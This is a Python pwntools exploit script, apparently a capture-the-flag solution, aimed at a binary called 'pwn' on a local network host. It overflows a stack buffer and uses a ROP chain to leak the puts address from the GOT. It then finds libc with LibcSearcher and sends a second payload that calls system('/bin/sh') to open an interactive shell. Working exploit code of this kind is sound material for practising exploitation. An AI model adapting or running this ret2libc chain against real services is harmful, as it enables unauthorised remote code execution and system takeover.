from pwn import * 
from pwn import p64,u64
from LibcSearcher import *

debug = 0
gdb_is = 0
# context(arch='i386',os = 'linux')
context(arch='amd64',os = 'linux', log_level='DEBUG')
if debug:
    context.terminal = ['/mnt/c/Users/sagiriking/AppData/Local/Microsoft/WindowsApps/wt.exe','nt','Ubuntu','-c']
    r = process("./pwn")
    
else:
    host = "192.168.0.111:59839"
    r = connect(host.split(':')[0],host.split(':')[1])#远程连接
    gdb_is =0

if gdb_is:
    # r = gdb.debug("./pwn",'b vuln')
    # gdb.attach(r,'b vuln')
    pass
   
elf = ELF('./pwn')
pop_rdi = 0x000040117e
r.recvuntil(b'u??\n\n')
paylod = b'A'*80 + b'junkjunk' + p64(pop_rdi) + p64(elf.got['puts']) + p64(elf.sym['puts']) + p64(elf.sym['vuln'])
#
r.send(paylod)
addr = r.recv(6).ljust(8,b'\x00')
puts_addr = u64(addr)
info(f'puts_addr -> {hex(puts_addr)}')
libc = LibcSearcher('puts',puts_addr)

offser = puts_addr - libc.dump('puts')
binsh = offser + libc.dump('str_bin_sh')
system = offser + libc.dump('system')
paylod = b'A'*80 + b'junkjunk' + p64(pop_rdi) + p64(binsh) + p64(0x000040101a)+p64(system)
r.recvuntil(b'u??\n\n')
r.send(paylod)
r.interactive()
